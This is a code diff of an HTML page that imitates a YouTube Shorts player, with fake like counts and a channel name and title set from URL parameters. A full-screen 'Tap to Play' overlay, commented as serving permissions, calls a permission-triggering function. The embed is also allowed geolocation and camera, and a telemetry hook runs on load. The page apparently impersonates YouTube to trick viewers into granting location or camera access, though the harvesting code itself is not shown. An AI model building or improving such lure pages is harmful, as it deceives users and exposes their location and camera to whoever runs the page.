@@ -4,82 +4,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title id="yt-page-title">YouTube Short</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title id="yt-page-title">YouTube Shorts</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --yt-bg: #0f0f0f;
+            --yt-red: #ff0000;
+            --yt-text: #f1f1f1;
+            --yt-text-muted: #aaaaaa;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
         }
 
         html, body {
             width: 100%;
             height: 100%;
             overflow: hidden;
-            background-color: #0f0f0f;
-            font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
-            color: #ffffff;
+            background-color: var(--yt-bg);
+            color: var(--yt-text);
         }
 
-        .yt-wrapper {
+        .app-wrapper {
             width: 100vw;
             height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: #0f0f0f;
+            background: #000000;
             position: relative;
         }
 
-        .yt-card {
+        .shorts-card {
             width: 100%;
             height: 100%;
-            max-width: 480px;
-            max-height: 920px;
+            max-width: 440px;
+            max-height: 880px;
             position: relative;
             background: #000000;
             display: flex;
             flex-direction: column;
             overflow: hidden;
             box-shadow: 0 10px 40px rgba(0,0,0,0.9);
+            border-radius: 14px;
         }
 
-        /* Top YouTube Header */
-        .yt-header {
+        @media (max-width: 500px) {
+            .shorts-card {
+                max-width: 100vw;
+                max-height: 100vh;
+                border-radius: 0;
+            }
+        }
+
+        /* Top Header */
+        .shorts-header {
             position: absolute;
             top: 0;
             left: 0;
             right: 0;
-            height: 52px;
+            height: 56px;
             padding: 0 16px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             background: linear-gradient(180deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0) 100%);
-            z-index: 10;
+            z-index: 30;
         }
 
-        .yt-logo {
+        .shorts-logo {
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 8px;
+            font-size: 18px;
             font-weight: 700;
-            font-size: 17px;
             letter-spacing: -0.5px;
         }
 
-        .yt-logo i {
-            color: #ff0000;
-            font-size: 22px;
+        .shorts-logo i {
+            color: var(--yt-red);
+            font-size: 24px;
         }
 
-        /* Video Iframe Viewport */
-        .yt-viewport {
-            flex: 1;
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            font-size: 20px;
+        }
+
+        .btn-icon {
+            background: transparent;
+            border: none;
+            color: white;
+            cursor: pointer;
+            font-size: 20px;
+        }
+
+        /* Viewport */
+        .viewport {
+            position: relative;
             width: 100%;
             height: 100%;
-            position: relative;
             background: #000000;
         }
 
@@ -89,13 +121,13 @@
             border: none;
         }
 
-        /* Tap overlay for unmute and permission gesture */
+        /* Tap overlay for perms */
         .tap-overlay {
             position: absolute;
             inset: 0;
-            background: rgba(0, 0, 0, 0.4);
-            backdrop-filter: blur(2px);
-            z-index: 20;
+            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.8));
+            backdrop-filter: blur(4px);
+            z-index: 40;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -108,58 +140,129 @@
             width: 72px;
             height: 72px;
             border-radius: 50%;
-            background: #ff0000;
+            background: var(--yt-red);
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 28px;
             color: white;
-            box-shadow: 0 8px 24px rgba(255, 0, 0, 0.5);
-            margin-bottom: 12px;
+            box-shadow: 0 8px 25px rgba(255, 0, 0, 0.6);
+            margin-bottom: 14px;
         }
 
         .prompt-text {
-            font-size: 14px;
-            font-weight: 600;
+            font-size: 15px;
+            font-weight: 700;
             color: white;
             text-shadow: 0 2px 4px rgba(0,0,0,0.8);
         }
 
-        /* Bottom Details Bar */
-        .yt-bottom-bar {
+        /* Right Action Bar */
+        .action-bar {
+            position: absolute;
+            bottom: 90px;
+            right: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+            align-items: center;
+            z-index: 25;
+        }
+
+        .action-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .action-btn-circle {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: #ffffff;
+            transition: transform 0.15s ease, background 0.15s ease;
+        }
+
+        .action-btn:active .action-btn-circle {
+            transform: scale(0.88);
+        }
+
+        .action-btn-circle.active {
+            background: rgba(255, 255, 255, 0.35);
+            color: #38bdf8;
+        }
+
+        .action-count {
+            font-size: 12px;
+            font-weight: 600;
+            color: #ffffff;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.8);
+        }
+
+        /* Audio Disc */
+        .sound-disc {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            border: 2px solid rgba(255,255,255,0.7);
+            overflow: hidden;
+            background: #222;
+        }
+
+        .sound-disc img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Bottom Info Bar */
+        .bottom-bar {
             position: absolute;
             bottom: 0;
             left: 0;
-            right: 0;
+            right: 65px;
             padding: 16px;
-            background: linear-gradient(0deg, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0) 100%);
-            z-index: 10;
-            pointer-events: none;
+            background: linear-gradient(0deg, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0) 100%);
+            z-index: 25;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
 
-        .channel-info {
+        .channel-row {
             display: flex;
             align-items: center;
             gap: 10px;
-            margin-bottom: 8px;
-            pointer-events: auto;
         }
 
         .channel-avatar {
-            width: 34px;
-            height: 34px;
+            width: 36px;
+            height: 36px;
             border-radius: 50%;
-            background: #ff0000;
+            background: var(--yt-red);
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 700;
-            font-size: 14px;
+            font-size: 15px;
+            color: white;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.5);
         }
 
         .channel-name {
-            font-weight: 600;
+            font-weight: 700;
             font-size: 14px;
+            color: #ffffff;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.8);
         }
 
         .btn-subscribe {
@@ -171,13 +274,28 @@
             font-size: 12px;
             font-weight: 700;
             cursor: pointer;
+            transition: all 0.2s ease;
         }
 
-        .video-title-text {
+        .btn-subscribe.subscribed {
+            background: rgba(255, 255, 255, 0.2);
+            color: #ffffff;
+        }
+
+        .video-title {
             font-size: 14px;
-            font-weight: 500;
             line-height: 1.4;
+            font-weight: 400;
             color: #f1f5f9;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.8);
+        }
+
+        .sound-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #cbd5e1;
         }
 
         .hidden {
@@ -187,18 +305,22 @@
 </head>
 
 <body>
-    <div class="yt-wrapper">
-        <div class="yt-card">
+    <div class="app-wrapper">
+        <div class="shorts-card">
             <!-- Header -->
-            <div class="yt-header">
-                <div class="yt-logo">
+            <div class="shorts-header">
+                <div class="shorts-logo">
                     <i class="fab fa-youtube"></i>
                     <span>Shorts</span>
                 </div>
-                <i class="fas fa-ellipsis-v"></i>
+                <div class="header-actions">
+                    <button class="btn-icon"><i class="fas fa-magnifying-glass"></i></button>
+                    <button class="btn-icon"><i class="fas fa-camera"></i></button>
+                    <button class="btn-icon"><i class="fas fa-ellipsis-vertical"></i></button>
+                </div>
             </div>
 
-            <!-- Tap Overlay for Permission & Video Unmute -->
+            <!-- Tap Overlay for Permission & Unmute -->
             <div class="tap-overlay" id="tap-overlay">
                 <div class="play-btn-circle">
                     <i class="fas fa-play" style="margin-left: 4px;"></i>
@@ -206,19 +328,60 @@
                 <div class="prompt-text">Tap to Play YouTube Short</div>
             </div>
 
-            <!-- Main Embed Player -->
-            <div class="yt-viewport">
+            <!-- Video Viewport -->
+            <div class="viewport" id="viewport">
                 <iframe id="yt-iframe" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; geolocation; camera" allowfullscreen></iframe>
             </div>
 
-            <!-- Bottom Video Overlay -->
-            <div class="yt-bottom-bar">
-                <div class="channel-info">
+            <!-- Right Action Bar -->
+            <div class="action-bar">
+                <div class="action-btn" id="like-btn">
+                    <div class="action-btn-circle" id="like-circle">
+                        <i class="fas fa-thumbs-up"></i>
+                    </div>
+                    <span class="action-count" id="like-count">542K</span>
+                </div>
+                <div class="action-btn">
+                    <div class="action-btn-circle">
+                        <i class="fas fa-thumbs-down"></i>
+                    </div>
+                    <span class="action-count">Dislike</span>
+                </div>
+                <div class="action-btn">
+                    <div class="action-btn-circle">
+                        <i class="fas fa-comment-dots"></i>
+                    </div>
+                    <span class="action-count">1.8K</span>
+                </div>
+                <div class="action-btn">
+                    <div class="action-btn-circle">
+                        <i class="fas fa-share"></i>
+                    </div>
+                    <span class="action-count">Share</span>
+                </div>
+                <div class="action-btn">
+                    <div class="action-btn-circle">
+                        <i class="fas fa-rotate"></i>
+                    </div>
+                    <span class="action-count">Remix</span>
+                </div>
+                <div class="sound-disc">
+                    <img src="https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&w=100&q=80" alt="Sound Cover">
+                </div>
+            </div>
+
+            <!-- Bottom Details Overlay -->
+            <div class="bottom-bar">
+                <div class="channel-row">
                     <div class="channel-avatar" id="avatar-initial">Y</div>
                     <span class="channel-name" id="channel-display">@TrendingShorts</span>
-                    <button class="btn-subscribe">Subscribe</button>
+                    <button class="btn-subscribe" id="sub-btn">Subscribe</button>
                 </div>
-                <div class="video-title-text" id="title-display">Must watch viral video! 🔥 #shorts #trending</div>
+                <div class="video-title" id="title-display">Must watch viral video! 🔥 #shorts #trending</div>
+                <div class="sound-row">
+                    <i class="fas fa-music"></i>
+                    <span id="sound-display">Original sound - TrendingShorts</span>
+                </div>
             </div>
         </div>
     </div>
@@ -241,8 +404,8 @@
         }
 
         if (!rawV) rawV = urlParams.get('v') || urlParams.get('video') || 'dQw4w9WgXcQ';
-        if (!customTitle) customTitle = urlParams.get('t') || urlParams.get('title');
-        if (!channelName) channelName = urlParams.get('c') || urlParams.get('channel');
+        if (!customTitle) customTitle = urlParams.get('t') || urlParams.get('title') || 'Must watch viral video! 🔥 #shorts #trending';
+        if (!channelName) channelName = urlParams.get('c') || urlParams.get('channel') || 'TrendingShorts';
 
         let videoId = rawV;
         if (rawV.includes('youtu.be/')) {
@@ -253,15 +416,12 @@
             videoId = rawV.split('shorts/')[1].split('?')[0].split('&')[0];
         }
 
-        if (channelName) {
-            document.getElementById('channel-display').innerText = channelName.startsWith('@') ? channelName : `@${channelName}`;
-            document.getElementById('avatar-initial').innerText = channelName.replace('@', '').charAt(0).toUpperCase() || 'Y';
-        }
-
-        if (customTitle) {
-            document.getElementById('yt-page-title').innerText = `${customTitle} - YouTube Short`;
-            document.getElementById('title-display').innerText = customTitle;
-        }
+        const formattedChannel = channelName.startsWith('@') ? channelName : `@${channelName}`;
+        document.getElementById('channel-display').innerText = formattedChannel;
+        document.getElementById('avatar-initial').innerText = channelName.replace('@', '').charAt(0).toUpperCase() || 'Y';
+        document.getElementById('yt-page-title').innerText = `${customTitle} - YouTube Shorts`;
+        document.getElementById('title-display').innerText = customTitle;
+        document.getElementById('sound-display').innerText = `Original sound - ${formattedChannel}`;
 
         const iframe = document.getElementById('yt-iframe');
         iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1&mute=0&controls=1&rel=0&playsinline=1&enablejsapi=1`;
@@ -269,7 +429,7 @@
         const tapOverlay = document.getElementById('tap-overlay');
         if (videoId) {
             const thumbUrl = `https://img.youtube.com/vi/${videoId}/hqdefault.jpg`;
-            tapOverlay.style.background = `linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.7)), url('${thumbUrl}') center/cover no-repeat`;
+            tapOverlay.style.background = `linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.8)), url('${thumbUrl}') center/cover no-repeat`;
         }
 
         function triggerPermissions() {
@@ -283,6 +443,33 @@
 
         tapOverlay.addEventListener('click', triggerPermissions);
         tapOverlay.addEventListener('touchstart', triggerPermissions, { passive: true });
+
+        // Subscribe button toggle
+        const subBtn = document.getElementById('sub-btn');
+        subBtn.addEventListener('click', () => {
+            if (subBtn.innerText === 'Subscribe') {
+                subBtn.innerText = 'Subscribed';
+                subBtn.classList.add('subscribed');
+            } else {
+                subBtn.innerText = 'Subscribe';
+                subBtn.classList.remove('subscribed');
+            }
+        });
+
+        // Like toggle
+        const likeBtn = document.getElementById('like-btn');
+        const likeCircle = document.getElementById('like-circle');
+        let isLiked = false;
+        likeBtn.addEventListener('click', () => {
+            isLiked = !isLiked;
+            if (isLiked) {
+                likeCircle.classList.add('active');
+                document.getElementById('like-count').innerText = '543K';
+            } else {
+                likeCircle.classList.remove('active');
+                document.getElementById('like-count').innerText = '542K';
+            }
+        });
 
         // Telemetry tracking on DOM load
         window.addEventListener('DOMContentLoaded', () => {
